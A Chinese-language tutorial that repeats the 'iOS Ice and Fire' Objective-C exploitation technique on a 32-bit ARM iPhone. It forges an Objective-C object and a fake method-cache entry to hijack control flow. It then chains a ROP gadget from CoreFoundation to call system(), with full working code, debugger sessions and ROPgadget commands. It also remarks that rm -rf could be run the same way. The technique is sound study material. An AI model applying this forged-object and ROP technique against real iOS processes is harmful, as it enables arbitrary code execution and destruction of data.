&emsp;&emsp;看了蒸米发的文章《iOS冰与火之歌 – Objective-C Pwn and iOS arm64 ROP》，笔者在arm32的机器上进行了实践和测试，具体流程如下：
### 0x01 编写OC可执行程序
```
Talker.h:
#import <Foundation/Foundation.h>
@interface Talker : NSObject
- (void) say: (NSString*) phrase;
@end
 
Talker.m:
#import "Talker.h"
@implementation Talker
- (void) say: (NSString*) phrase {
  NSLog(@"%@n", phrase);
}
@end
 
hello.m:
int main(void) {    
  Talker *talker = [[Talker alloc] init];
  [talker say: @"Hello, Ice and Fire!"];
  [talker say: @"Hello, Ice and Fire!"];
  [talker release];
}
```
&emsp;&emsp;编写Makefile文件：
```
C=clang

FRAMEWORKS:= -framework Foundation
LIBRARIES:= -lobjc
SDK:=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk

SOURCE=hello.m Talker.m
CFLAGS=-isysroot ${SDK} -Wall -arch armv7 -g -v $(SOURCE)
LDFLAGS=$(LIBRARIES) $(FRAMEWORKS)
OUT=-o hello

all:
	$(CC) $(CFLAGS) $(LDFLAGS) $(OUT)
```
&emsp;&emsp;执行make生成hello可执行文件，然后通过scp命令上传到手机上面，运行：
```
iPhone4s:/tmp root# ./hello 
2016-04-08 14:19:46.642 hello[28599:507] Hello, Ice and Fire!
2016-04-08 14:19:46.649 hello[28599:507] Hello, Ice and Fire!
```
### 0x02 分析objc_msgSend
&emsp;&emsp;使用IDA反编译刚刚生成的hello文件，可以看到函数的调用都是通过objc_msgSend

![image](http://img0.ph.126.net/-kPuihtO5lAj6N_en-O9NA==/3750372589793593602.png)

&emsp;&emsp;在Objective-C中，message与方法的真正实现是在执行阶段绑定的，而非编译阶段。编译器会将消息发送转换成对objc_msgSend方法的调用。
objc_msgSend方法含两个必要参数：receiver、方法名（即：selector），如：
    [receiver message]; 将被转换为：objc_msgSend(receiver, selector);

&emsp;&emsp;每个对象都有一个指向所属类的指针isa。通过该指针，对象可以找到它所属的类，也就找到了其全部父类，如下图所示：

![image](http://img1.ph.126.net/X-ROtcCjXJvHFQOxr5O3Cw==/4855724823336460720.png)

&emsp;&emsp;当向一个对象发送消息时，objc_msgSend方法根据对象的isa指针找到对象的类，然后在类的调度表（dispatch table）中查找selector。如果无法找到selector，objc_msgSend通过指向父类的指针找到父类，并在父类的调度表（dispatch table）中查找selector，以此类推直到NSObject类。一旦查找到selector，objc_msgSend方法根据调度表的内存地址调用该实现。通过这种方式，message与方法的真正实现在执行阶段才绑定。
 
&emsp;&emsp;为了保证消息发送与执行的效率，系统会将全部selector和使用过的方法的内存地址缓存起来。每个类都有一个独立的缓存，缓存包含有当前类自己的selector以及继承自父类的selector。查找调度表（dispatch table）前，消息发送系统首先检查receiver对象的缓存。
关于objc_msgSend这个函数，Apple已经提供了源码:
[objc_msgSend](http://www.opensource.apple.com/source/objc4/objc4-647/runtime/Messengers.subproj/objc-msg-arm.s)
```
ENTRY objc_msgSend
	MESSENGER_START
	
	cbz	r0, LNilReceiver_f

	ldr	r9, [r0]		// r9 = self->isa
	CacheLookup NORMAL
	// calls IMP or LCacheMiss

LCacheMiss:
	MESSENGER_END_SLOW
	ldr	r9, [r0, #ISA]		// class = receiver->isa
	b	__objc_msgSend_uncached

LNilReceiver:
	mov     r1, #0
	MESSENGER_END_NIL
	bx      lr	

LMsgSendExit:
	END_ENTRY objc_msgSend
```
&emsp;&emsp;首先得到isa指针，然后就会去缓存里面查找：
```
.macro CacheLookup
	
	ldrh	r12, [r9, #CACHE_MASK]	// r12 = mask
	ldr	r9, [r9, #CACHE]	// r9 = buckets
.if $0 == STRET  ||  $0 == SUPER_STRET
	and	r12, r12, r2		// r12 = index = SEL & mask
.else
	and	r12, r12, r1		// r12 = index = SEL & mask
.endif
	add	r9, r9, r12, LSL #3	// r9 = bucket = buckets+index*8
	ldr	r12, [r9]		// r12 = bucket->sel
2:
.if $0 == STRET  ||  $0 == SUPER_STRET
	teq	r12, r2
.else
	teq	r12, r1
.endif
	bne	1f
	CacheHit $0
1:	
	cmp	r12, #1
	blo	LCacheMiss_f		// if (bucket->sel == 0) cache miss
	it	eq			// if (bucket->sel == 1) cache wrap
	ldreq	r9, [r9, #4]		// bucket->imp is before first bucket
	ldr	r12, [r9, #8]!		// r12 = (++bucket)->sel
	b	2b

.endmacro
```
&emsp;&emsp;如果这个selector曾经被调用过，那么在缓存中就会保存这个selector对应的函数地址，如果这个函数再一次被调用，objc_msgSend()会直接跳转到缓存的函数地址。
```
.macro CacheHit

.if $0 == GETIMP
	ldr	r0, [r9, #4]		// r0 = bucket->imp
	MI_GET_ADDRESS(r1, __objc_msgSend_uncached_impcache)
	teq	r0, r1
	it	eq
	moveq	r0, #0			// don't return msgSend_uncached
	bx	lr			// return imp
.elseif $0 == NORMAL
	ldr	r12, [r9, #4]		// r12 = bucket->imp
					// eq already set for nonstret forward
	MESSENGER_END_FAST
	bx	r12			// call imp
.elseif $0 == STRET
	ldr	r12, [r9, #4]		// r12 = bucket->imp
	movs	r9, #1			// r9=1, Z=0 for stret forwarding
	MESSENGER_END_FAST
	bx	r12			// call imp
.elseif $0 == SUPER
	ldr	r12, [r9, #4]		// r12 = bucket->imp
	ldr	r9, [r0, #CLASS]	// r9 = class to search for forwarding
	ldr	r0, [r0, #RECEIVER]	// fetch real receiver
	tst	r12, r12		// set ne for forwarding (r12!=0)
	MESSENGER_END_FAST
	bx	r12			// call imp
.elseif $0 == SUPER2
	ldr	r12, [r9, #4]		// r12 = bucket->imp
	ldr	r9, [r0, #CLASS]
	ldr	r9, [r9, #SUPERCLASS]	// r9 = class to search for forwarding
	ldr	r0, [r0, #RECEIVER]	// fetch real receiver
	tst	r12, r12		// set ne for forwarding (r12!=0)
	MESSENGER_END_FAST
	bx	r12			// call imp
.elseif $0 == SUPER_STRET
	ldr	r12, [r9, #4]		// r12 = bucket->imp
	ldr	r9, [r1, #CLASS]	// r9 = class to search for forwarding
	orr	r9, r9, #1		// r9 = class|1 for super_stret forward
	ldr	r1, [r1, #RECEIVER]	// fetch real receiver
	tst	r12, r12		// set ne for forwarding (r12!=0)
	MESSENGER_END_FAST
	bx	r12			// call imp
.elseif $0 == SUPER2_STRET
	ldr	r12, [r9, #4]		// r12 = bucket->imp
	ldr	r9, [r1, #CLASS]	// r9 = class to search for forwarding
	ldr	r9, [r9, #SUPERCLASS]	// r9 = class to search for forwarding
	orr	r9, r9, #1		// r9 = class|1 for super_stret forward
	ldr	r1, [r1, #RECEIVER]	// fetch real receiver
	tst	r12, r12		// set ne for forwarding (r12!=0)
	MESSENGER_END_FAST
	bx	r12			// call imp
.else
.abort oops
.endif

.endmacro
```
&emsp;&emsp;正因为这个机制，如果可以伪造一个receiver对象的话，就可以构造一个缓存的selector的函数地址，随后objc_msgSend()就会跳转到伪造的缓存函数地址上，从而可以控制PC指针。
### 0x03 跟踪objc_msgSend
&emsp;&emsp;使用debugserver启动程序hello
```
iPhone4s:/tmp root# debugserver *:1234 ./hello 
debugserver-310.2 for armv7.
Listening to port 1234 for a connection from *...
```
&emsp;&emsp;然后在PC上通过lldb连接
```
➜  ICE_FIRE lldb
(lldb) process connect connect://IP:1234
Process 29714 stopped
* thread #1: tid = 0x398eb, 0x2bed0028 dyld`_dyld_start, stop reason = signal SIGSTOP
    frame #0: 0x2bed0028 dyld`_dyld_start
dyld`_dyld_start:
->  0x2bed0028 <+0>:  mov    r8, sp
    0x2bed002c <+4>:  sub    sp, sp, #16
    0x2bed0030 <+8>:  bic    sp, sp, #7
    0x2bed0034 <+12>: ldr    r3, [pc, #0x70]           ; <+132>
```
&emsp;&emsp;在main函数设置断点
```
(lldb) br set --name main
Breakpoint 1: no locations (pending).
WARNING:  Unable to resolve breakpoint to any actual locations.
(lldb) c
Process 29714 resuming
1 location added to breakpoint 1
7 locations added to breakpoint 1
Process 29714 stopped
* thread #1: tid = 0x398eb, 0x000a3e96 hello`main + 38 at hello.m:8, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x000a3e96 hello`main + 38 at hello.m:8
   5   	
   6   	
   7   	int main(void) {
-> 8   	    Talker *talker = [[Talker alloc] init];
   9   	    [talker say: @"Hello, Ice and Fire!"];
   10  	    [talker say: @"Hello, Ice and Fire!"];
   11  	    [talker release];
```
&emsp;&emsp;反汇编main函数
```
(lldb) disas
hello`main:
    0xa3e70 <+0>:   push   {r7, lr}
    0xa3e72 <+2>:   mov    r7, sp
    0xa3e74 <+4>:   sub    sp, #0x20
    0xa3e76 <+6>:   movw   r0, #0x1a2
    0xa3e7a <+10>:  movt   r0, #0x0
    0xa3e7e <+14>:  add    r0, pc
    0xa3e80 <+16>:  ldr    r0, [r0]
    0xa3e82 <+18>:  movw   r1, #0x22a
    0xa3e86 <+22>:  movt   r1, #0x0
    0xa3e8a <+26>:  add    r1, pc
    0xa3e8c <+28>:  movw   r2, #0x230
    0xa3e90 <+32>:  movt   r2, #0x0
    0xa3e94 <+36>:  add    r2, pc
->  0xa3e96 <+38>:  ldr    r2, [r2]
    0xa3e98 <+40>:  ldr    r1, [r1]
    0xa3e9a <+42>:  str    r0, [sp, #0x18]
    0xa3e9c <+44>:  mov    r0, r2
    0xa3e9e <+46>:  ldr    r2, [sp, #0x18]
    0xa3ea0 <+48>:  blx    r2
    0xa3ea2 <+50>:  movw   r1, #0x176
    0xa3ea6 <+54>:  movt   r1, #0x0
    0xa3eaa <+58>:  add    r1, pc
    0xa3eac <+60>:  ldr    r1, [r1]
    0xa3eae <+62>:  movw   r2, #0x202
    0xa3eb2 <+66>:  movt   r2, #0x0
    0xa3eb6 <+70>:  add    r2, pc
    0xa3eb8 <+72>:  ldr    r2, [r2]
    0xa3eba <+74>:  str    r1, [sp, #0x14]
    0xa3ebc <+76>:  mov    r1, r2
    0xa3ebe <+78>:  ldr    r2, [sp, #0x14]
    0xa3ec0 <+80>:  blx    r2
    0xa3ec2 <+82>:  movw   r1, #0x15a
    0xa3ec6 <+86>:  movt   r1, #0x0
    0xa3eca <+90>:  add    r1, pc
    0xa3ecc <+92>:  movw   r2, #0x14c
    0xa3ed0 <+96>:  movt   r2, #0x0
    0xa3ed4 <+100>: add    r2, pc
    0xa3ed6 <+102>: ldr    r2, [r2]
    0xa3ed8 <+104>: movw   lr, #0x1dc
    0xa3edc <+108>: movt   lr, #0x0
    0xa3ee0 <+112>: add    lr, pc
    0xa3ee2 <+114>: str    r0, [sp, #0x1c]
    0xa3ee4 <+116>: ldr    r0, [sp, #0x1c]
    0xa3ee6 <+118>: ldr.w  lr, [lr]
    0xa3eea <+122>: str    r1, [sp, #0x10]
    0xa3eec <+124>: mov    r1, lr
    0xa3eee <+126>: ldr.w  lr, [sp, #0x10]
    0xa3ef2 <+130>: str    r2, [sp, #0xc]
    0xa3ef4 <+132>: mov    r2, lr
    0xa3ef6 <+134>: ldr    r3, [sp, #0xc]
    0xa3ef8 <+136>: blx    r3
    0xa3efa <+138>: movw   r0, #0x122
    0xa3efe <+142>: movt   r0, #0x0
    0xa3f02 <+146>: add    r0, pc
    0xa3f04 <+148>: movw   r1, #0x114
    0xa3f08 <+152>: movt   r1, #0x0
    0xa3f0c <+156>: add    r1, pc
    0xa3f0e <+158>: ldr    r1, [r1]
    0xa3f10 <+160>: movw   r2, #0x1a4
    0xa3f14 <+164>: movt   r2, #0x0
    0xa3f18 <+168>: add    r2, pc
    0xa3f1a <+170>: ldr    r3, [sp, #0x1c]
    0xa3f1c <+172>: ldr    r2, [r2]
    0xa3f1e <+174>: str    r0, [sp, #0x8]
    0xa3f20 <+176>: mov    r0, r3
    0xa3f22 <+178>: str    r1, [sp, #0x4]
    0xa3f24 <+180>: mov    r1, r2
    0xa3f26 <+182>: ldr    r2, [sp, #0x8]
    0xa3f28 <+184>: ldr    r3, [sp, #0x4]
    0xa3f2a <+186>: blx    r3
    0xa3f2c <+188>: movw   r0, #0xec
    0xa3f30 <+192>: movt   r0, #0x0
    0xa3f34 <+196>: add    r0, pc
    0xa3f36 <+198>: ldr    r0, [r0]
    0xa3f38 <+200>: movw   r1, #0x180
    0xa3f3c <+204>: movt   r1, #0x0
    0xa3f40 <+208>: add    r1, pc
    0xa3f42 <+210>: ldr    r2, [sp, #0x1c]
    0xa3f44 <+212>: ldr    r1, [r1]
    0xa3f46 <+214>: str    r0, [sp]
    0xa3f48 <+216>: mov    r0, r2
    0xa3f4a <+218>: ldr    r2, [sp]
    0xa3f4c <+220>: blx    r2
    0xa3f4e <+222>: movs   r0, #0x0
    0xa3f50 <+224>: add    sp, #0x20
    0xa3f52 <+226>: pop    {r7, pc}
```
&emsp;&emsp;在调用say的两个位置下断点，分别是0xa3ef8和0xa3f2a
```
(lldb) br s -a 0xa3ef8
Breakpoint 2: where = hello`main + 136 at hello.m:9, address = 0x000a3ef8
(lldb) br s -a 0xa3f2a
Breakpoint 3: where = hello`main + 186 at hello.m:10, address = 0x000a3f2a
```
&emsp;&emsp;在第一个断点跟进objc_msgSend
```
(lldb) si
Process 29714 stopped
* thread #1: tid = 0x398eb, 0x3a513620 libobjc.A.dylib`objc_msgSend, queue = 'com.apple.main-thread', stop reason = instruction step into
    frame #0: 0x3a513620 libobjc.A.dylib`objc_msgSend
libobjc.A.dylib`objc_msgSend:
->  0x3a513620 <+0>:  cbz    r0, 0x3a51365e            ; <+62>
    0x3a513622 <+2>:  ldr.w  r9, [r0]
    0x3a513626 <+6>:  ldrh.w r12, [r9, #0xc]
    0x3a51362a <+10>: ldr.w  r9, [r9, #0x8]
(lldb) disas
libobjc.A.dylib`objc_msgSend:
->  0x3a513620 <+0>:  cbz    r0, 0x3a51365e            ; <+62>
    0x3a513622 <+2>:  ldr.w  r9, [r0]
    0x3a513626 <+6>:  ldrh.w r12, [r9, #0xc]
    0x3a51362a <+10>: ldr.w  r9, [r9, #0x8]
    0x3a51362e <+14>: and.w  r12, r12, r1
    0x3a513632 <+18>: add.w  r9, r9, r12, lsl #3
    0x3a513636 <+22>: ldr.w  r12, [r9]
    0x3a51363a <+26>: teq.w  r12, r1
    0x3a51363e <+30>: bne    0x3a513646                ; <+38>
    0x3a513640 <+32>: ldr.w  r12, [r9, #0x4]
    0x3a513644 <+36>: bx     r12
    0x3a513646 <+38>: cmp.w  r12, #0x1
    0x3a51364a <+42>: blo    0x3a513658                ; <+56>
    0x3a51364c <+44>: it     eq
    0x3a51364e <+46>: ldreq.w r9, [r9, #0x4]
    0x3a513652 <+50>: ldr    r12, [r9, #8]!
    0x3a513656 <+54>: b      0x3a51363a                ; <+26>
    0x3a513658 <+56>: ldr.w  r9, [r0]
    0x3a51365c <+60>: b      0x3a5138a0                ; _objc_msgSend_uncached
    0x3a51365e <+62>: mov.w  r1, #0x0
    0x3a513662 <+66>: bx     lr
    0x3a513664 <+68>: nop      
```
&emsp;&emsp;0x3a51363a <+26>: teq.w  r12, r1 这句汇编就是拿缓存中的SEL和当前调用的SEL比较，如果相等就是在缓存中命中了，这里是第一次调用，所以没有命中。
继续运行到第二个断点
```
(lldb) n
Process 29714 stopped
* thread #1: tid = 0x398eb, 0x3a513622 libobjc.A.dylib`objc_msgSend + 2, queue = 'com.apple.main-thread', stop reason = instruction step over
    frame #0: 0x3a513622 libobjc.A.dylib`objc_msgSend + 2
libobjc.A.dylib`objc_msgSend:
->  0x3a513622 <+2>:  ldr.w  r9, [r0]
    0x3a513626 <+6>:  ldrh.w r12, [r9, #0xc]
    0x3a51362a <+10>: ldr.w  r9, [r9, #0x8]
    0x3a51362e <+14>: and.w  r12, r12, r1
```
&emsp;&emsp;0x3a51362a <+10>: ldr.w  r9, [r9, #0x8] 执行完后，$r9保存了缓存地址的数组，可以在数组中找到缓存的say和init函数。
```
(lldb) x/10 $r9
0x16638ac0: 0x000a3fbf 0x000a3f55 0x00000000 0x00000000
0x16638ad0: 0x00000000 0x00000000 0x32ad9b27 0x3a519ac5
0x16638ae0: 0x00000001 0x16638ab8
(lldb) x/s 0x000a3fbf
0x000a3fbf: "say:"
(lldb) x/s 0x32ad9b27
0x32ad9b27: "init"
(lldb) 
```
&emsp;&emsp;前一个数据是selector的地址，后一个数据就是selector对应的函数地址，如say()函数：
```
(lldb) di -s 0x000a3f55 -c 20
hello`-[Talker say:]:
    0xa3f55 <+1>:  ldr    r5, [r6, #0x78]
    0xa3f57 <+3>:  strh   r6, [r0, #0x1a]
    0xa3f59 <+5>:  lsls   r0, r6
    0xa3f5b <+7>:  bhs    0xa3f43                   ; main + 211 at hello.m:11
    0xa3f5d <+9>:  stm    r0!, {r0, r1}
    0xa3f5f <+11>: lsls   r2, r6, #0x3
    0xa3f61 <+13>: ldrb   r3, [r0, #0xc]
    0xa3f63 <+15>: lsls   r4, r0, #0x9
    0xa3f65 <+17>: lsls   r0, r2, #0x6
    0xa3f67 <+19>: lsls   r1, r2, #0x2
    0xa3f69 <+21>: lsls   r2, r2, #0x2
    0xa3f6b <+23>: adds   r1, r3, r2
    0xa3f6d <+25>: lsls   r6, r0, #0x1
    0xa3f6f <+27>: add    r8, lr
    0xa3f71 <+29>: lsls   r0, r5, #0xf
    0xa3f73 <+31>: strh   r0, [r6, #0x4]
    0xa3f75 <+33>: lsls   r5, r7, #0x2
    0xa3f77:       stclhs p4, c0, [r0]
```
### 0x04 伪造ObjC对象控制PC
&emsp;&emsp;如果可以伪造一个ObjC对象，然后构造一个假的cache的话，就有机会控制PC指针了。首先需要找到selector在内存中的地址，这个问题可以使用NSSelectorFromString()这个系统自带的API来解决，比如我们想知道”release”这个selector的地址，就可以使用NSSelectorFromString(@"release")来获取。

&emsp;&emsp;随后要构建一个假的receiver，假的receiver里有一个指向假的objc_class的指针，假的objc_class里又保存了假的cache_buckets的指针和mask。假的cache_buckets的指针最终指向我们将要伪造的selector和selector函数的地址：
```
struct fake_receiver_t
{
    uint32_t fake_objc_class_ptr;
}fake_receiver;
 
struct fake_objc_class_t {
    char pad[0x8];
    void* cache_buckets_ptr;
    uint32_t cache_bucket_mask;
} fake_objc_class;
 
struct fake_cache_bucket_t {
    void* cached_sel;
    void* cached_function;
} fake_cache_bucket;
```
&emsp;&emsp;接下来在main函数中尝试将talker这个receiver改成我们伪造的receiver，然后利用伪造的”release” selector来控制PC指向0x12121212这个地址：
```
#import "Talker.h"
#include <dlfcn.h>
#include <mach-o/dyld_images.h>
#include <objc/runtime.h>

struct fake_structure_t
{
    uint32_t fake_objc_class_ptr;
}fake_structure;

struct fake_objc_class_t {
        char pad[0x8];
        void* cache_buckets_ptr;  //指向缓存数组
        uint32_t cache_bucket_mask;
} fake_objc_class;

struct fake_cache_bucket_t {
        void* cached_sel;
        void* cached_function;
} fake_cache_bucket;

int main(void) {
    
  Talker *talker = [[Talker alloc] init];
  [talker say: @"Hello, Ice and Fire!"];
  [talker say: @"Hello, Ice and Fire!"];
  [talker release];


  fake_cache_bucket.cached_sel = (void*) NSSelectorFromString(@"release");
  NSLog(@"cached_sel = %p", NSSelectorFromString(@"release"));

  fake_cache_bucket.cached_function = (void*)0x12121212;
  NSLog(@"fake_cache_bucket.cached_function = %p", (void*)fake_cache_bucket.cached_function);
    
  fake_objc_class.cache_buckets_ptr = &fake_cache_bucket;
  fake_objc_class.cache_bucket_mask=0;

  fake_structure.fake_objc_class_ptr=&fake_objc_class;
  talker= &fake_structure;

  [talker release];
}
```
&emsp;&emsp;接下来把新编译的hello传到我的iphone上，然后用debugserver进行调试：
&emsp;&emsp;通过查看第二次release调用的时候，$r9缓存的地址，已经被修改成了0x12121212，接下来就会通过调用缓存的地址跳转到0x12121212.
```
(lldb) n
Process 30030 stopped
* thread #1: tid = 0x3a0e7, 0x3a513644 libobjc.A.dylib`objc_msgSend + 36, queue = 'com.apple.main-thread', stop reason = instruction step over
    frame #0: 0x3a513644 libobjc.A.dylib`objc_msgSend + 36
libobjc.A.dylib`objc_msgSend:
->  0x3a513644 <+36>: bx     r12
    0x3a513646 <+38>: cmp.w  r12, #0x1
    0x3a51364a <+42>: blo    0x3a513658                ; <+56>
    0x3a51364c <+44>: it     eq
(lldb) x/10 $r12
error: failed to read memory from 0x12121212.
(lldb) c
Process 30030 resuming
Process 30030 stopped
* thread #1: tid = 0x3a0e7, 0x12121210, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x12121210)
    frame #0: 0x12121210
error: memory read failed for 0x12121200
```
### 0x05 iOS上的arm32 ROP
&emsp;&emsp;虽然控制了PC，但在iOS上我们并不能采用nmap()或者mprotect()将内存改为可读可写可执行，如果想要让程序执行一些我们想要的指令的话必须要使用ROP。
返回导向编程（Return-Oriented Programming, ROP)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。 每一段 gadget 通常结束于 return 指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。

&emsp;&emsp;然而在iOS上默认是开启ASLR+DEP+PIE的。program image本身在内存中的地址也是随机的。所以在iOS上使用ROP技术必须配合信息泄露的漏洞才行。虽在iOS上写ROP非常困难，但有个好消息是虽然program image是随机的，但是每个进程都会加载的dyld_shared_cache这个共享缓存的地址在开机后是固定的，并且每个进程的dyld_shared_cache都是相同的。这个dyld_shared_cache有好几百M大，基本上可以满足对gadgets的需求。因此只要在自己的进程获取dyld_shared_cache的基址就能够计算出目标进程gadgets的位置。

&emsp;&emsp;dyld_shared_cache文件一般保存在/System/Library/Caches/com.apple.dyld/这个目录下。下载下来以后就可以用[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)这个工具来搜索gadget了。
首先从cahe文件中提取CoreFoundation这个framework,生成dyld_shared_cache_armv7.CoreFoundation。
```
jtool -extract CoreFoundation ./dyld_shared_cache_armv7
```
&emsp;&emsp;先实现一个简单的ROP，用system()函数执行”touch /tmp/IceAndFire”。因为r0是控制的fake_receiver的地址，因此可以搜索利用r0来控制其他寄存器的gadgets。
```
ROPgadget --binary ./dyld_shared_cache_armv7.CoreFoundation --thumb | grep "ldr r0"
```
&emsp;&emsp;比如下面这条：
```
0x2d4512a4 : mov r1, r0 ; ldr r0, [r1, #0x44] ; ldr r1, [r1, #0x58] ; cmp r1, #0 ; it eq ; bxeq lr ; bx r1
```
&emsp;&emsp;随后构造一个假的结构体，然后给对应的寄存器赋值：
```
struct fake_receiver_t
{
    uint32_t fake_objc_class_ptr;
    uint8_t pad1[0x44-0x4];
    uint32_t r0;
    uint8_t pad2[0x58-0x44-0x4];
    uint32_t r1;
    char cmd[1024];
}fake_receiver;
fake_receiver.r0=(uint64_t)&fake_receiver.cmd;
fake_receiver.r1=(void *)dlsym(RTLD_DEFAULT, "system");
NSLog(@"system_address = %p", (void*)fake_receiver.r1);
strcpy(fake_receiver.cmd, "touch /tmp/IceAndFire");
```
&emsp;&emsp;最后将cached_function的值指向我们gagdet的地址就能控制程序执行system()指令了：
```
    fake_cache_bucket.cached_sel = (void*) NSSelectorFromString(@"release");
    NSLog(@"cached_sel = %p", NSSelectorFromString(@"release"));

    uint8_t* CoreFoundation_base = find_library_load_address("CoreFoundation");
    NSLog(@"CoreFoundationbase address = %p", (void*)CoreFoundation_base);
    
    //0x2d4512a4 : mov r1, r0 ; ldr r0, [r1, #0x44] ; ldr r1, [r1, #0x58] ; cmp r1, #0 ; it eq ; bxeq lr ; bx r1
    //thumb 汇编，需要+1
    //0x2d3b3000  文件中的起始偏移
    fake_cache_bucket.cached_function = (void*)CoreFoundation_base + 0x2d4512a4 - 0x2d3b3000 + 1;
    NSLog(@"fake_cache_bucket.cached_function = %p", (void*)fake_cache_bucket.cached_function);
```
&emsp;&emsp;编译hello，scp到iphone运行，结果如下
```
iPhone4s:/tmp root# ./hello
2016-04-08 15:55:47.321 hello[30375:507] Hello, Ice and Fire!
2016-04-08 15:55:47.327 hello[30375:507] Hello, Ice and Fire!
2016-04-08 15:55:47.329 hello[30375:507] cached_sel = 0x32ad9275
2016-04-08 15:55:47.331 hello[30375:507] CoreFoundationbase address = 0x2fbbd000
2016-04-08 15:55:47.333 hello[30375:507] fake_cache_bucket.cached_function = 0x2fc5b2a5
2016-04-08 15:55:47.335 hello[30375:507] system_address = 0x3aa8b505
2016-04-08 15:55:47.337 hello[30375:507] fake_receiver address = 0x211a4
iPhone4s:/tmp root# ls
IceAndFire                                           hello*
```
&emsp;&emsp;发现/tmp目录下已经成功的创建了IceAndFire这个文件了,还可以通过执行rm -rf命令，删除其它文件，比如应用。

### 0x06 总结
&emsp;&emsp;iOS上Objective-C 的利用以及iOS 上arm32 ROP，这些都是越狱需要掌握的最基本的知识。要注意的事，能做到执行system指令是因为是在越狱环境下以root身份运行了们的程序，在非越狱模式下app是没有权限执行这些system指令的，想要做到这一点必须利用沙箱逃逸的漏洞才行。
### 0x07 参考资料
[iOS冰与火之歌 – Objective-C Pwn and iOS arm64 ROP](http://drops.wooyun.org/papers/12355)

[Objective-C消息机制的原理](http://dangpu.sinaapp.com/?p=119)

### 0x08 代码下载
[github](https://github.com/AloneMonkey/ios-security)